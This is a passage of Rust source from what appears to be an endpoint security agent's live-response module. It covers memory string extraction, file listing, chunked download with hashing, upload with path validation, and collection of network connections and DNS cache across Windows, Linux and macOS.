    // ---- 2. Extract strings from every region ----
    let mut all_strings: Vec<ExtractedString> = Vec::new();

    for region in &regions {
        if all_strings.len() >= MAX_STRINGS_COLLECTED {
            break;
        }

        // ASCII strings
        for (offset, content) in extract_ascii_strings(&region.data, min_length) {
            if all_strings.len() >= MAX_STRINGS_COLLECTED {
                break;
            }
            all_strings.push(ExtractedString {
                virtual_address: region.base_address + offset as u64,
                content,
                is_ascii: true,
            });
        }

        // UTF-16 LE strings
        if include_unicode && all_strings.len() < MAX_STRINGS_COLLECTED {
            for (offset, content) in extract_unicode_strings(&region.data, min_length) {
                if all_strings.len() >= MAX_STRINGS_COLLECTED {
                    break;
                }
                // Avoid duplicating strings that are identical to an ASCII
                // extraction at a nearby address (common for ASCII-only
                // UTF-16 strings that also appear in the ASCII pass).
                all_strings.push(ExtractedString {
                    virtual_address: region.base_address + offset as u64,
                    content,
                    is_ascii: false,
                });
            }
        }
    }

    // ---- 3. Classify interesting strings ----
    let mut urls: Vec<serde_json::Value> = Vec::new();
    let mut ip_addresses: Vec<serde_json::Value> = Vec::new();
    let mut interesting: Vec<serde_json::Value> = Vec::new();

    for es in &all_strings {
        if let Some(category) = classify_string(&es.content) {
            let entry = serde_json::json!({
                "address": format!("0x{:x}", es.virtual_address),
                "value": es.content,
                "encoding": if es.is_ascii { "ascii" } else { "utf16le" },
            });
            match category {
                "url" => urls.push(entry),
                "ip_address" => ip_addresses.push(entry),
                _ => interesting.push(serde_json::json!({
                    "address": format!("0x{:x}", es.virtual_address),
                    "value": es.content,
                    "category": category,
                    "encoding": if es.is_ascii { "ascii" } else { "utf16le" },
                })),
            }
        }
    }

    // ---- 4. Optionally write full string list to disk ----
    let mut output_path: Option<String> = None;

    if save_to_disk || all_strings.len() > MAX_INLINE_STRINGS {
        let dump_dir = if cfg!(windows) {
            "C:\\ProgramData\\Tamandua\\dumps"
        } else {
            "/var/lib/tamandua/dumps"
        };

        let _ = std::fs::create_dir_all(dump_dir);
        let timestamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);

        let path = format!("{}/strings_{}_{}.txt", dump_dir, pid, timestamp);

        let mut content = String::new();
        for es in &all_strings {
            use std::fmt::Write;
            let _ = writeln!(
                content,
                "0x{:016x}\t{}\t{}",
                es.virtual_address,
                if es.is_ascii { "A" } else { "U" },
                es.content
            );
        }

        match std::fs::write(&path, &content) {
            Ok(_) => {
                info!(path = %path, count = all_strings.len(), "Wrote strings to disk");
                output_path = Some(path);
            }
            Err(e) => {
                warn!(error = %e, "Failed to write strings file");
            }
        }
    }

    let duration_ms = start_time.elapsed().as_millis() as u64;

    // Truncate inline lists if needed
    let inline_urls = &urls[..std::cmp::min(urls.len(), MAX_INLINE_STRINGS)];
    let inline_ips = &ip_addresses[..std::cmp::min(ip_addresses.len(), MAX_INLINE_STRINGS)];
    let inline_interesting = &interesting[..std::cmp::min(interesting.len(), MAX_INLINE_STRINGS)];

    info!(
        pid,
        total = all_strings.len(),
        urls = urls.len(),
        ips = ip_addresses.len(),
        interesting = interesting.len(),
        duration_ms,
        "Memory string extraction complete"
    );

    CommandResult {
        success: true,
        error_message: None,
        result_data: Some(serde_json::json!({
            "pid": pid,
            "total_count": all_strings.len(),
            "regions_read": regions.len(),
            "bytes_read": total_mem_bytes,
            "urls": inline_urls,
            "ip_addresses": inline_ips,
            "interesting": inline_interesting,
            "urls_total": urls.len(),
            "ip_addresses_total": ip_addresses.len(),
            "interesting_total": interesting.len(),
            "output_path": output_path,
            "duration_ms": duration_ms,
            "truncated": all_strings.len() >= MAX_STRINGS_COLLECTED,
        })),
    }
}

/// List files in a directory
pub async fn live_response_file_list(payload: &serde_json::Value) -> CommandResult {
    let path = payload.get("path").and_then(|v| v.as_str()).unwrap_or(".");
    let recursive = payload
        .get("recursive")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let include_hidden = payload
        .get("include_hidden")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let max_depth = payload
        .get("max_depth")
        .and_then(|v| v.as_u64())
        .unwrap_or(1) as usize;

    info!(
        path = path,
        recursive = recursive,
        "Live response: listing files"
    );

    // Validate the target path
    let validated = match validate_path(path) {
        Ok(p) => p,
        Err(e) => {
            warn!(path = path, reason = %e, "Rejected file list path");
            return CommandResult {
                success: false,
                error_message: Some(format!("Path validation failed: {}", e)),
                result_data: None,
            };
        }
    };

    let mut files = Vec::new();

    fn list_dir(
        path: &Path,
        files: &mut Vec<serde_json::Value>,
        depth: usize,
        max_depth: usize,
        recursive: bool,
        include_hidden: bool,
    ) {
        if depth > max_depth {
            return;
        }

        if let Ok(entries) = std::fs::read_dir(path) {
            for entry in entries.flatten() {
                let file_path = entry.path();
                let name = file_path
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_default();

                // Skip hidden files if not requested
                if !include_hidden && name.starts_with('.') {
                    continue;
                }

                let metadata = std::fs::metadata(&file_path).ok();
                let is_dir = file_path.is_dir();

                files.push(serde_json::json!({
                    "path": file_path.to_string_lossy(),
                    "name": name,
                    "is_directory": is_dir,
                    "size": metadata.as_ref().map(|m| m.len()).unwrap_or(0),
                    "modified": metadata.as_ref()
                        .and_then(|m| m.modified().ok())
                        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                        .map(|d| d.as_secs()),
                    "created": metadata.as_ref()
                        .and_then(|m| m.created().ok())
                        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                        .map(|d| d.as_secs()),
                    "readonly": metadata.as_ref().map(|m| m.permissions().readonly()).unwrap_or(false),
                }));

                if recursive && is_dir {
                    list_dir(
                        &file_path,
                        files,
                        depth + 1,
                        max_depth,
                        recursive,
                        include_hidden,
                    );
                }
            }
        }
    }

    list_dir(
        &validated,
        &mut files,
        0,
        max_depth,
        recursive,
        include_hidden,
    );

    CommandResult {
        success: true,
        error_message: None,
        result_data: Some(serde_json::json!({
            "path": validated.to_string_lossy(),
            "files": files,
            "count": files.len()
        })),
    }
}

/// Chunk size for file downloads: 1 MB
const FILE_DOWNLOAD_CHUNK_SIZE: usize = 1024 * 1024;

/// Maximum file size for automatic compression (10 MB)
const COMPRESSION_THRESHOLD: u64 = 10 * 1024 * 1024;

/// Download a file with streaming support to avoid OOM on large files.
///
/// For files larger than COMPRESSION_THRESHOLD, the file is optionally compressed
/// with gzip. Files are streamed in chunks to avoid loading the entire file into memory.
///
/// If the file is small (< 1MB), it uses the legacy single-shot transfer for
/// backward compatibility. For larger files, it sends metadata first, then streams
/// chunks, and finally sends a completion message.
pub async fn live_response_file_download(payload: &serde_json::Value) -> CommandResult {
    let path = payload.get("path").and_then(|v| v.as_str()).unwrap_or("");
    let command_id = payload
        .get("command_id")
        .and_then(|v| v.as_str())
        .unwrap_or("");

    if path.is_empty() {
        return CommandResult {
            success: false,
            error_message: Some("Path is required".to_string()),
            result_data: None,
        };
    }

    // Validate the target path
    let validated = match validate_path(path) {
        Ok(p) => p,
        Err(e) => {
            warn!(path = path, reason = %e, "Rejected file download path");
            return CommandResult {
                success: false,
                error_message: Some(format!("Path validation failed: {}", e)),
                result_data: None,
            };
        }
    };

    info!(path = %validated.display(), "Live response: downloading file");

    // Get file metadata
    let metadata = match std::fs::metadata(&validated) {
        Ok(m) => m,
        Err(e) => {
            return CommandResult {
                success: false,
                error_message: Some(format!("Failed to get file metadata: {}", e)),
                result_data: None,
            };
        }
    };

    let file_size = metadata.len();

    // For small files (< 1MB), use legacy single-shot transfer for backward compatibility
    if file_size < FILE_DOWNLOAD_CHUNK_SIZE as u64 {
        return legacy_file_download(&validated, file_size).await;
    }

    // For large files, use streaming transfer
    match stream_file_download(&validated, file_size, command_id).await {
        Ok(result_data) => CommandResult {
            success: true,
            error_message: None,
            result_data: Some(result_data),
        },
        Err(e) => CommandResult {
            success: false,
            error_message: Some(format!("File download failed: {}", e)),
            result_data: None,
        },
    }
}

/// Legacy single-shot file download for small files (backward compatibility).
async fn legacy_file_download(path: &std::path::Path, _file_size: u64) -> CommandResult {
    match std::fs::read(path) {
        Ok(content) => {
            let mut sha256_hasher = Sha256::new();
            sha256_hasher.update(&content);
            let sha256 = hex::encode(sha256_hasher.finalize());

            // Base64 encode for transfer
            let encoded =
                base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &content);

            CommandResult {
                success: true,
                error_message: None,
                result_data: Some(serde_json::json!({
                    "path": path.to_string_lossy(),
                    "size": content.len(),
                    "sha256": sha256,
                    "content": encoded,
                    "transfer_mode": "single_shot"
                })),
            }
        }
        Err(e) => CommandResult {
            success: false,
            error_message: Some(format!("Failed to read file: {}", e)),
            result_data: None,
        },
    }
}

/// Stream a large file in chunks with optional compression.
///
/// This function:
/// 1. Opens the file and computes its SHA256 hash while streaming
/// 2. Optionally compresses the file if it exceeds COMPRESSION_THRESHOLD
/// 3. Returns metadata for the caller to send to the backend
///
/// IMPORTANT: This implementation currently buffers all chunks in memory before
/// returning, which is an intermediate step. The full streaming implementation
/// would require passing a BackendClient reference to send chunks progressively.
///
/// For production use with very large files (>100MB), consider refactoring to:
/// - Accept a BackendClient parameter
/// - Send chunks progressively using send_file_chunk()
/// - Use a channel-based producer/consumer pattern
///
/// Backend receiver implementation (Elixir):
/// ```elixir
/// # In Tamandua.Response.Executor module:
/// def handle_file_download_chunk(%{
///   "command_id" => command_id,
///   "offset" => offset,
///   "data" => base64_data,
///   "compressed" => compressed?
/// }) do
///   # Decode base64
///   data = Base.decode64!(base64_data)
///
///   # Decompress if needed
///   data = if compressed?, do: :zlib.gunzip(data), else: data
///
///   # Write to temporary file
///   tmp_path = "/tmp/downloads/#{command_id}"
///   File.write!(tmp_path, data, [:append, :binary])
///
///   # Track progress in ETS
///   :ets.update_counter(:file_downloads, command_id, {2, byte_size(data)})
/// end
///
/// def handle_file_download_complete(%{
///   "command_id" => command_id,
///   "sha256" => expected_hash
/// }) do
///   tmp_path = "/tmp/downloads/#{command_id}"
///
///   # Verify hash
///   actual_hash = :crypto.hash(:sha256, File.read!(tmp_path))
///     |> Base.encode16(case: :lower)
///
///   if actual_hash == expected_hash do
///     # Move to permanent storage
///     final_path = "/var/lib/tamandua/downloads/#{command_id}"
///     File.rename!(tmp_path, final_path)
///     {:ok, final_path}
///   else
///     {:error, :hash_mismatch}
///   end
/// end
/// ```
async fn stream_file_download(
    path: &std::path::Path,
    file_size: u64,
    command_id: &str,
) -> Result<serde_json::Value, String> {
    use tokio::io::AsyncReadExt;

    // Open file asynchronously
    let mut file = tokio::fs::File::open(path)
        .await
        .map_err(|e| format!("Failed to open file: {}", e))?;

    // Compute SHA256 hash while reading
    let mut sha256_hasher = Sha256::new();
    let mut total_read: u64 = 0;
    let mut chunks = Vec::new();

    // Determine if we should compress
    let use_compression = file_size > COMPRESSION_THRESHOLD;

    if use_compression {
        info!(
            path = %path.display(),
            size_mb = file_size / (1024 * 1024),
            "Large file detected, will compress during transfer"
        );
    }

    // Read file in chunks with timeout protection
    let mut buffer = vec![0u8; FILE_DOWNLOAD_CHUNK_SIZE];
    let read_timeout = tokio::time::Duration::from_secs(30);

    loop {
        // Timeout protection: if a single chunk read takes >30s, abort
        let bytes_read = match tokio::time::timeout(read_timeout, file.read(&mut buffer)).await {
            Ok(Ok(n)) => n,
            Ok(Err(e)) => {
                return Err(format!("Read error at offset {}: {}", total_read, e));
            }
            Err(_) => {
                return Err(format!("Read timeout at offset {} (>30s)", total_read));
            }
        };

        if bytes_read == 0 {
            break; // EOF
        }

        let chunk_data = &buffer[..bytes_read];
        sha256_hasher.update(chunk_data);

        // Encode chunk for transfer
        let encoded = if use_compression {
            // Compress chunk with gzip
            use flate2::write::GzEncoder;
            use flate2::Compression;
            let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
            std::io::Write::write_all(&mut encoder, chunk_data)
                .map_err(|e| format!("Compression failed: {}", e))?;
            let compressed = encoder
                .finish()
                .map_err(|e| format!("Compression finish failed: {}", e))?;
            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &compressed)
        } else {
            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, chunk_data)
        };

        chunks.push(serde_json::json!({
            "offset": total_read,
            "size": bytes_read,
            "data": encoded,
            "compressed": use_compression,
        }));

        total_read += bytes_read as u64;

        // Log progress every 10 MB
        if total_read % (10 * 1024 * 1024) == 0 {
            info!(
                path = %path.display(),
                progress_mb = total_read / (1024 * 1024),
                total_mb = file_size / (1024 * 1024),
                "Download progress"
            );
        }

        // Safety check: abort if we've accumulated too many chunks in memory
        // This prevents OOM on extremely large files (>1GB)
        if chunks.len() > 1000 {
            warn!(
                path = %path.display(),
                size_gb = file_size / (1024 * 1024 * 1024),
                "File too large for in-memory buffering, aborting"
            );
            return Err(format!(
                "File too large (>1GB) for current implementation. \
                Consider using progressive streaming with BackendClient."
            ));
        }
    }

    let sha256 = hex::encode(sha256_hasher.finalize());

    info!(
        path = %path.display(),
        size = file_size,
        chunks = chunks.len(),
        compressed = use_compression,
        sha256 = %sha256,
        "File download complete"
    );

    // Return metadata and chunks for the caller to transmit
    Ok(serde_json::json!({
        "path": path.to_string_lossy(),
        "size": file_size,
        "sha256": sha256,
        "transfer_mode": "chunked",
        "chunk_count": chunks.len(),
        "chunk_size": FILE_DOWNLOAD_CHUNK_SIZE,
        "compressed": use_compression,
        "chunks": chunks,
        "command_id": command_id,
    }))
}

/// Calculate file hash
pub async fn live_response_file_hash(payload: &serde_json::Value) -> CommandResult {
    let path = payload.get("path").and_then(|v| v.as_str()).unwrap_or("");

    if path.is_empty() {
        return CommandResult {
            success: false,
            error_message: Some("Path is required".to_string()),
            result_data: None,
        };
    }

    // Validate the target path
    let validated = match validate_path(path) {
        Ok(p) => p,
        Err(e) => {
            warn!(path = path, reason = %e, "Rejected file hash path");
            return CommandResult {
                success: false,
                error_message: Some(format!("Path validation failed: {}", e)),
                result_data: None,
            };
        }
    };

    info!(path = %validated.display(), "Live response: calculating file hash");

    match std::fs::File::open(&validated) {
        Ok(mut file) => {
            let mut md5_hasher = md5::Context::new();
            let mut sha1_hasher = Sha1::new();
            let mut sha256_hasher = Sha256::new();
            let mut buffer = [0u8; 8192];
            let mut total_size = 0u64;

            loop {
                match file.read(&mut buffer) {
                    Ok(0) => break,
                    Ok(n) => {
                        md5_hasher.consume(&buffer[..n]);
                        sha1_hasher.update(&buffer[..n]);
                        sha256_hasher.update(&buffer[..n]);
                        total_size += n as u64;
                    }
                    Err(e) => {
                        return CommandResult {
                            success: false,
                            error_message: Some(format!("Read error: {}", e)),
                            result_data: None,
                        };
                    }
                }
            }

            CommandResult {
                success: true,
                error_message: None,
                result_data: Some(serde_json::json!({
                    "path": validated.to_string_lossy(),
                    "size": total_size,
                    "md5": hex::encode(md5_hasher.compute().0),
                    "sha1": hex::encode(sha1_hasher.finalize()),
                    "sha256": hex::encode(sha256_hasher.finalize())
                })),
            }
        }
        Err(e) => CommandResult {
            success: false,
            error_message: Some(format!("Failed to open file: {}", e)),
            result_data: None,
        },
    }
}

/// Upload a file (receive from server)
pub async fn live_response_file_upload(payload: &serde_json::Value) -> CommandResult {
    let path = payload.get("path").and_then(|v| v.as_str()).unwrap_or("");
    let content_b64 = payload
        .get("content")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let create_dirs = payload
        .get("create_dirs")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    if path.is_empty() || content_b64.is_empty() {
        return CommandResult {
            success: false,
            error_message: Some("Path and content are required".to_string()),
            result_data: None,
        };
    }

    // For uploads the target file may not exist yet.  Validate the parent
    // directory instead, then reconstruct the full target path.
    let target = Path::new(path);

    // Length check
    if path.len() > MAX_PATH_LEN {
        warn!(path = path, "Rejected file upload path: exceeds max length");
        return CommandResult {
            success: false,
            error_message: Some(format!(
                "Path exceeds maximum allowed length ({} > {})",
                path.len(),
                MAX_PATH_LEN
            )),
            result_data: None,
        };
    }

    // Reject `..` components
    for component in target.components() {
        if let std::path::Component::ParentDir = component {
            warn!(path = path, "Rejected file upload path: contains ..");
            return CommandResult {
                success: false,
                error_message: Some("Path traversal (..) is not allowed".to_string()),
                result_data: None,
            };
        }
    }

    // Reject UNC paths on Windows
    #[cfg(target_os = "windows")]
    {
        let normalized = path.replace('/', "\\");
        if normalized.starts_with("\\\\") {
            warn!(path = path, "Rejected file upload path: UNC path");
            return CommandResult {
                success: false,
                error_message: Some("UNC paths are not allowed".to_string()),
                result_data: None,
            };
        }
    }

    // Validate the parent directory exists and can be canonicalized.  For
    // model/rule staging, allow creating only the immediate missing parent
    // under an already-canonical grandparent; this keeps uploads useful
    // without turning Live Response into an arbitrary mkdir primitive.
    let parent = target.parent().unwrap_or(Path::new("."));
    let canonical_parent = match std::fs::canonicalize(parent) {
        Ok(p) => p,
        Err(e) => {
            if create_dirs {
                if let Some(grandparent) = parent.parent() {
                    match std::fs::canonicalize(grandparent) {
                        Ok(canonical_grandparent) => {
                            if let Some(parent_name) = parent.file_name() {
                                let created_parent = canonical_grandparent.join(parent_name);
                                match std::fs::create_dir(&created_parent) {
                                    Ok(()) => created_parent,
                                    Err(create_err) => {
                                        warn!(
                                            path = path,
                                            reason = %create_err,
                                            "Rejected file upload path: parent creation failed"
                                        );
                                        return CommandResult {
                                            success: false,
                                            error_message: Some(format!(
                                                "Parent directory creation failed: {}",
                                                create_err
                                            )),
                                            result_data: None,
                                        };
                                    }
                                }
                            } else {
                                return CommandResult {
                                    success: false,
                                    error_message: Some("Invalid parent directory".to_string()),
                                    result_data: None,
                                };
                            }
                        }
                        Err(grandparent_err) => {
                            warn!(
                                path = path,
                                reason = %grandparent_err,
                                "Rejected file upload path: grandparent canonicalization failed"
                            );
                            return CommandResult {
                                success: false,
                                error_message: Some(format!(
                                    "Parent directory validation failed: {}",
                                    grandparent_err
                                )),
                                result_data: None,
                            };
                        }
                    }
                } else {
                    return CommandResult {
                        success: false,
                        error_message: Some("Invalid parent directory".to_string()),
                        result_data: None,
                    };
                }
            } else {
                warn!(path = path, reason = %e, "Rejected file upload path: parent canonicalization failed");
                return CommandResult {
                    success: false,
                    error_message: Some(format!("Parent directory validation failed: {}", e)),
                    result_data: None,
                };
            }
        }
    };

    let file_name = match target.file_name() {
        Some(n) => n,
        None => {
            return CommandResult {
                success: false,
                error_message: Some("Invalid file name".to_string()),
                result_data: None,
            };
        }
    };

    let validated = canonical_parent.join(file_name);

    info!(path = %validated.display(), "Live response: uploading file");

    match base64::Engine::decode(&base64::engine::general_purpose::STANDARD, content_b64) {
        Ok(content) => match std::fs::write(&validated, &content) {
            Ok(_) => {
                let mut sha256_hasher = Sha256::new();
                sha256_hasher.update(&content);

                CommandResult {
                    success: true,
                    error_message: None,
                    result_data: Some(serde_json::json!({
                        "path": validated.to_string_lossy(),
                        "size": content.len(),
                        "sha256": hex::encode(sha256_hasher.finalize())
                    })),
                }
            }
            Err(e) => CommandResult {
                success: false,
                error_message: Some(format!("Failed to write file: {}", e)),
                result_data: None,
            },
        },
        Err(e) => CommandResult {
            success: false,
            error_message: Some(format!("Failed to decode content: {}", e)),
            result_data: None,
        },
    }
}

/// Get network connections
pub async fn live_response_network_connections(payload: &serde_json::Value) -> CommandResult {
    let state_filter = payload.get("state").and_then(|v| v.as_str());
    let protocol_filter = payload.get("protocol").and_then(|v| v.as_str());
    let pid_filter = payload
        .get("pid")
        .and_then(|v| v.as_u64())
        .map(|p| p as u32);

    info!("Live response: getting network connections");

    let mut connections: Vec<serde_json::Value> = Vec::new();

    #[cfg(target_os = "windows")]
    {
        use std::process::Command;

        let output = Command::new("netstat").args(["-ano"]).output();

        if let Ok(out) = output {
            let stdout = String::from_utf8_lossy(&out.stdout);
            for line in stdout.lines().skip(4) {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 5 {
                    let protocol = parts[0].to_lowercase();
                    let pid: u32 = parts.last().and_then(|p| p.parse().ok()).unwrap_or(0);
                    let state = parts.get(3).unwrap_or(&"").to_string();

                    // Apply filters
                    if let Some(pf) = protocol_filter {
                        if !protocol.contains(&pf.to_lowercase()) {
                            continue;
                        }
                    }
                    if let Some(sf) = state_filter {
                        if !state.to_lowercase().contains(&sf.to_lowercase()) {
                            continue;
                        }
                    }
                    if let Some(pf) = pid_filter {
                        if pid != pf {
                            continue;
                        }
                    }

                    connections.push(serde_json::json!({
                        "protocol": protocol,
                        "local_address": parts[1],
                        "remote_address": parts[2],
                        "state": state,
                        "pid": pid
                    }));
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    {
        use std::process::Command;

        let output = Command::new("ss").args(["-tunapO"]).output();

        if let Ok(out) = output {
            let stdout = String::from_utf8_lossy(&out.stdout);
            for line in stdout.lines().skip(1) {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 5 {
                    connections.push(serde_json::json!({
                        "state": parts.get(0).unwrap_or(&""),
                        "recv_q": parts.get(1).unwrap_or(&""),
                        "send_q": parts.get(2).unwrap_or(&""),
                        "local_address": parts.get(3).unwrap_or(&""),
                        "remote_address": parts.get(4).unwrap_or(&""),
                        "process": parts.get(5).unwrap_or(&"")
                    }));
                }
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        use std::process::Command;

        let output = Command::new("lsof")
            .args(["-i", "-n", "-P", "-F", "pcnPT"])
            .output();

        let mut parsed = match output {
            Ok(out) if out.status.success() => {
                parse_macos_lsof_network_connections(&String::from_utf8_lossy(&out.stdout))
            }
            Ok(out) => {
                warn!(
                    status = ?out.status.code(),
                    stderr = %String::from_utf8_lossy(&out.stderr).trim(),
                    "Live response lsof failed on macOS; falling back to netstat"
                );
                Vec::new()
            }
            Err(e) => {
                warn!(error = %e, "Live response lsof unavailable on macOS; falling back to netstat");
                Vec::new()
            }
        };

        if parsed.is_empty() {
            for protocol in ["tcp", "udp"] {
                match Command::new("netstat")
                    .args(["-anv", "-p", protocol])
                    .output()
                {
                    Ok(out) if out.status.success() => {
                        parsed.extend(parse_macos_netstat_network_connections(
                            &String::from_utf8_lossy(&out.stdout),
                        ));
                    }
                    Ok(out) => warn!(
                        status = ?out.status.code(),
                        stderr = %String::from_utf8_lossy(&out.stderr).trim(),
                        protocol,
                        "Live response netstat fallback failed on macOS"
                    ),
                    Err(e) => warn!(
                        error = %e,
                        protocol,
                        "Live response netstat fallback unavailable on macOS"
                    ),
                }
            }
        }

        connections.extend(parsed.into_iter().filter(|connection| {
            network_connection_matches_filters(
                connection,
                protocol_filter,
                state_filter,
                pid_filter,
            )
        }));
    }

    CommandResult {
        success: true,
        error_message: None,
        result_data: Some(serde_json::json!({
            "connections": connections,
            "count": connections.len()
        })),
    }
}

fn network_connection_matches_filters(
    connection: &serde_json::Value,
    protocol_filter: Option<&str>,
    state_filter: Option<&str>,
    pid_filter: Option<u32>,
) -> bool {
    if let Some(protocol_filter) = protocol_filter {
        let protocol = connection
            .get("protocol")
            .and_then(|value| value.as_str())
            .unwrap_or_default()
            .to_ascii_lowercase();
        if !protocol.contains(&protocol_filter.to_ascii_lowercase()) {
            return false;
        }
    }

    if let Some(state_filter) = state_filter {
        let state = connection
            .get("state")
            .and_then(|value| value.as_str())
            .unwrap_or_default()
            .to_ascii_lowercase();
        if !state.contains(&state_filter.to_ascii_lowercase()) {
            return false;
        }
    }

    if let Some(pid_filter) = pid_filter {
        let pid = connection
            .get("pid")
            .and_then(|value| value.as_u64())
            .unwrap_or_default() as u32;
        if pid != pid_filter {
            return false;
        }
    }

    true
}

fn parse_macos_lsof_network_connections(output: &str) -> Vec<serde_json::Value> {
    let mut connections = Vec::new();
    let mut current_pid = 0u32;
    let mut current_process = String::new();
    let mut current_protocol = String::new();
    let mut current_name_field: Option<String> = None;
    let mut current_state: Option<String> = None;

    for line in output.lines() {
        if line.is_empty() {
            continue;
        }

        let field_type = line.chars().next().unwrap_or(' ');
        let value = &line[1..];

        match field_type {
            'p' => {
                push_macos_lsof_network_connection(
                    &mut connections,
                    current_pid,
                    &current_process,
                    &current_protocol,
                    current_name_field.take(),
                    current_state.take(),
                );
                current_pid = value.parse().unwrap_or(0);
                current_protocol.clear();
            }
            'c' => current_process = value.to_string(),
            'P' => {
                push_macos_lsof_network_connection(
                    &mut connections,
                    current_pid,
                    &current_process,
                    &current_protocol,
                    current_name_field.take(),
                    current_state.take(),
                );
                current_protocol = value.to_ascii_lowercase();
            }
            'n' => {
                push_macos_lsof_network_connection(
                    &mut connections,
                    current_pid,
                    &current_process,
                    &current_protocol,
                    current_name_field.take(),
                    current_state.take(),
                );
                current_name_field = Some(value.to_string());
            }
            'T' => current_state = parse_macos_lsof_tcp_state(value).or(current_state),
            _ => {}
        }
    }

    push_macos_lsof_network_connection(
        &mut connections,
        current_pid,
        &current_process,
        &current_protocol,
        current_name_field,
        current_state,
    );

    connections
}

fn push_macos_lsof_network_connection(
    connections: &mut Vec<serde_json::Value>,
    pid: u32,
    process_name: &str,
    protocol: &str,
    name_field: Option<String>,
    state: Option<String>,
) {
    let Some(name_field) = name_field else {
        return;
    };

    let Some((local, remote)) = name_field.split_once("->") else {
        return;
    };

    let (Some((local_ip, local_port)), Some((remote_ip, remote_port))) = (
        parse_macos_colon_addr(local),
        parse_macos_colon_addr(remote),
    ) else {
        return;
    };

    if remote_port == 0 || is_macos_ignored_remote_ip(&remote_ip) {
        return;
    }

    connections.push(serde_json::json!({
        "protocol": protocol,
        "local_address": format!("{}:{}", local_ip, local_port),
        "remote_address": format!("{}:{}", remote_ip, remote_port),
        "local_ip": local_ip,
        "local_port": local_port,
        "remote_ip": remote_ip,
        "remote_port": remote_port,
        "state": state.unwrap_or_default(),
        "pid": pid,
        "process": process_name,
        "source": "lsof"
    }));
}

fn parse_macos_netstat_network_connections(output: &str) -> Vec<serde_json::Value> {
    output
        .lines()
        .filter_map(parse_macos_netstat_network_connection_line)
        .collect()
}

fn parse_macos_netstat_network_connection_line(line: &str) -> Option<serde_json::Value> {
    let parts: Vec<&str> = line.split_whitespace().collect();
    if parts.len() < 5 {
        return None;
    }

    let protocol = parts
        .first()?
        .trim_end_matches(|c: char| c.is_ascii_digit());
    if protocol != "tcp" && protocol != "udp" {
        return None;
    }

    let (local_ip, local_port) = parse_macos_netstat_addr(parts.get(3)?)?;
    let (remote_ip, remote_port) = parse_macos_netstat_addr(parts.get(4)?)?;
    if remote_port == 0 || is_macos_ignored_remote_ip(&remote_ip) {
        return None;
    }

    let state = if protocol == "tcp" {
        parts.get(5).copied().unwrap_or_default()
    } else {
        ""
    };
    let pid_index = if protocol == "tcp" { 8 } else { 7 };
    let pid = parts
        .get(pid_index)
        .and_then(|value| value.parse::<u32>().ok())
        .unwrap_or_default();

    Some(serde_json::json!({
        "protocol": protocol,
        "local_address": format!("{}:{}", local_ip, local_port),
        "remote_address": format!("{}:{}", remote_ip, remote_port),
        "local_ip": local_ip,
        "local_port": local_port,
        "remote_ip": remote_ip,
        "remote_port": remote_port,
        "state": state,
        "pid": pid,
        "process": if pid == 0 { "unknown".to_string() } else { format!("pid:{}", pid) },
        "source": "netstat"
    }))
}

fn parse_macos_lsof_tcp_state(value: &str) -> Option<String> {
    value
        .strip_prefix("ST=")
        .map(str::trim)
        .filter(|state| !state.is_empty())
        .map(ToString::to_string)
}

fn parse_macos_colon_addr(addr: &str) -> Option<(String, u16)> {
    let addr = addr.trim();
    let addr = addr.split_once(' ').map(|(addr, _)| addr).unwrap_or(addr);

    if addr.starts_with('[') {
        let bracket_end = addr.find(']')?;
        let ip = &addr[1..bracket_end];
        let port = addr.get(bracket_end + 2..)?.parse().ok()?;
        return Some((ip.to_string(), port));
    }

    let colon_pos = addr.rfind(':')?;
    let ip = &addr[..colon_pos];
    let port = addr[colon_pos + 1..].parse().ok()?;
    Some((ip.to_string(), port))
}

fn parse_macos_netstat_addr(addr: &str) -> Option<(String, u16)> {
    let addr = addr.trim();
    if addr == "*.*" || addr == "*" {
        return Some(("*".to_string(), 0));
    }

    let (ip, port) = addr.rsplit_once('.')?;
    let port = port.parse().ok()?;
    Some((ip.to_string(), port))
}

fn is_macos_ignored_remote_ip(ip: &str) -> bool {
    matches!(ip, "0.0.0.0" | "::" | "127.0.0.1" | "::1" | "*")
}

/// Get DNS cache
pub async fn live_response_dns_cache(_payload: &serde_json::Value) -> CommandResult {
    info!("Live response: getting DNS cache");

    let mut entries: Vec<serde_json::Value> = Vec::new();

    #[cfg(target_os = "windows")]
    {
        use std::process::Command;

        let output = Command::new("ipconfig").args(["/displaydns"]).output();

        if let Ok(out) = output {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let mut current_record = serde_json::Map::new();

            for line in stdout.lines() {
                let line = line.trim();
                if line.contains("Record Name") {
                    if let Some((_, name)) = line.split_once(':') {
                        current_record.insert("name".to_string(), serde_json::json!(name.trim()));
                    }
                } else if line.contains("Record Type") {
                    if let Some((_, rtype)) = line.split_once(':') {
                        current_record.insert("type".to_string(), serde_json::json!(rtype.trim()));
                    }
                } else if line.contains("A (Host) Record") || line.contains("AAAA Record") {
                    if let Some((_, data)) = line.split_once(':') {
                        current_record.insert("data".to_string(), serde_json::json!(data.trim()));
                        entries.push(serde_json::Value::Object(current_record.clone()));
                        current_record.clear();
                    }
                }
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        use std::process::Command;

        match Command::new("scutil").args(["--dns"]).output() {
            Ok(out) if out.status.success() => {
                entries.extend(parse_macos_scutil_dns(&String::from_utf8_lossy(
                    &out.stdout,
                )));
            }
            Ok(out) => {
                warn!(
                    status = ?out.status.code(),
                    stderr = %String::from_utf8_lossy(&out.stderr).trim(),
                    "Live response scutil --dns failed on macOS"
                );
            }
            Err(e) => {
                warn!(error = %e, "Failed to execute scutil --dns for macOS DNS inventory");
            }
        }
